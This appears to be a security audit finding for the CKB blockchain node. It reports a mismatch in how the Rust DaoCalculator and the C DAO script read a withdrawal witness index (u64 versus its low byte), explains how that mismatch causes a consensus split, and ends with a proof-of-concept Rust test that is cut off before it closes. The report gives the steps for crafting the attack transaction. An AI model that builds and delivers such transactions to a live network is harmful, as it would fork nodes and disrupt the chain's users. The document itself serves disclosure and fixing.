### Title
DAO Withdrawal Witness Index Truncation Causes C-Script / Rust Consensus Split — (`util/dao/src/lib.rs`)

### Summary

The Rust `DaoCalculator` reads the `header_deps_index` field from a DAO withdrawal witness as a full `u64`, while the on-chain C DAO script (`dao.c`) reads only the lowest byte (`u8`). An attacker can craft a withdrawal transaction whose witness encodes an index value > 255 (e.g., 257 = `0x0000000000000101`). The C script resolves the low byte (1) and finds the correct deposit-block header dep, so it passes. The Rust fee calculator resolves the full value (257) and finds a different header dep, so it fails with a block-number mismatch. Any block containing such a transaction is accepted by the C-script execution layer but rejected by the Rust node's `ContextualTransactionVerifier`, producing a consensus split.

### Finding Description

**Root cause — Rust side (`util/dao/src/lib.rs`, lines 91–98):**

```rust
Ok(LittleEndian::read_u64(&header_deps_index_data.unwrap()))
```

followed by:

```rust
rtx.transaction
    .header_deps()
    .get(header_dep_index as usize)   // uses full u64
    .and_then(|hash| header_deps.get(&hash))
    .ok_or(DaoError::InvalidOutPoint)
```

The Rust code uses the full 8-byte little-endian value as the index into `header_deps`.

**C DAO script behavior (documented in the test comment, `util/dao/src/tests.rs`, line 490):**

```
// Position 1: correct deposit block (what C VM resolves via lowest byte).
// Position 257: withdraw block (wrong — Rust resolves this with full u64).
```

The C script truncates the index to its lowest byte.

**Attack construction:**

An attacker builds a DAO withdrawal transaction with ≥ 258 `header_deps` entries:
- `header_deps[1]` = deposit block hash (correct)
- `header_deps[257]` = withdraw block hash (or any other block)

The witness `input_type` field encodes the value `257u64` in little-endian.

| Component | Reads index | Resolves to | Outcome |
|-----------|-------------|-------------|---------|
| C DAO script | `257 & 0xFF = 1` | deposit block | PASS |
| Rust `DaoCalculator` | `257` | withdraw block | FAIL (block number mismatch) |

The Rust node's `ContextualTransactionVerifier::verify()` calls `self.fee_calculator.transaction_fee()?`, which calls `DaoCalculator::transaction_maximum_withdraw()`, which fails because `deposit_header.number() (200) != deposited_block_number (100)`.

### Impact Explanation

Any block that a non-Rust miner (or a miner running modified software) assembles containing this crafted transaction will be accepted by the CKB-VM script execution layer but rejected by every Rust full node's block verifier. This is a **consensus split**: Rust nodes fork away from any chain that includes such a transaction, permanently diverging from miners who rely on the C script as the authoritative validator.

### Likelihood Explanation

The attacker does not need to be a miner. They need only:
1. Craft the transaction (trivial — just set 258 header deps and encode index 257 in the witness).
2. Deliver it to any miner not running the standard Rust node (e.g., a miner running an alternative implementation or modified software).

The transaction is rejected by Rust tx-pool admission, so it cannot propagate through standard Rust nodes. However, it can be delivered out-of-band directly to a miner's P2P port. The existence of even one non-Rust miner on the network makes this exploitable.

### Recommendation

Align the Rust `DaoCalculator` with the C script's index interpretation. Either:
- **Option A**: Truncate `header_dep_index` to `u8` in Rust to match the C script: `let header_dep_index = (header_dep_index & 0xFF) as usize;`
- **Option B**: Fix the C DAO script to read the full `u64` index, and update Rust accordingly.

Whichever interpretation is canonical must be enforced identically in both the C script and the Rust verifier.

```rust
#[test]
fn check_dao_withdraw_header_dep_index_exceeds_u8() {
    let deposit_number = 100u64;
    let withdraw_number = 200u64;

    let (_tmp_dir, store, deposit_block, withdraw_block) =
        setup_store_with_headers(deposit_number, withdraw_number);

    let consensus = Consensus::default();
    let dao_type_script = Script::new_builder()
        .code_hash(consensus.dao_type_hash())
        .hash_type(ScriptHashType::Type)
        .build();

    // Pad header_deps to 258 entries so index 257 is valid.
    // Position 1: correct deposit block (what C VM resolves via lowest byte).
    // Position 257: withdraw block (wrong — Rust resolves this with full u64).
    let dummy = h256!("0x1").into();
    let mut header_deps = vec![dummy; 258];
    header_deps[1] = deposit_block.hash();
    header_deps[257] = withdraw_block.hash();

    let cell_data = Bytes::from(deposit_number.to_le_bytes().to_vec());
    let input_cell = CellOutput::new_builder()
        .capacity(capacity_bytes!(1000000))
        .type_(Some(dao_type_script).pack())
        .build();
    let tx_info = TransactionInfo::new(
        withdraw_block.number(),
        withdraw_block.epoch(),
        withdraw_block.hash(),
        0,
    );
    let cell_meta = CellMetaBuilder::from_cell_output(input_cell, cell_data)
        .transaction_info(tx_info)
        .build();

    // input_type = 257, lowest byte = 1
    let witness = WitnessArgs::new_builder()
        .input_type(Some(Bytes::from(257u64.to_le_bytes().to_vec())))
        .build();
    let witness_bytes: Bytes = witness.as_bytes();

    let tx = TransactionBuilder::default()
        .set_header_deps(header_deps)
        .witness(witness_bytes)
        .build();

    let rtx = ResolvedTransaction {
        transaction: tx,
        resolved_cell_deps: vec![],
        resolved_inputs: vec![cell_meta],
        resolved_dep_groups: vec![],
    };

    let data_loader = store.borrow_as_data_loader();
    let calculator = DaoCalculator::new(&consensus, &data_loader);
    let result = calculator.transaction_fee(&rtx);

    // Rust resolves index 257 → withdraw block (number 200), but cell data
    // says deposited at block 100. Block number check catches the mismatch.
    assert!(result.is_err(), "expected Err, got {result:?}");
```
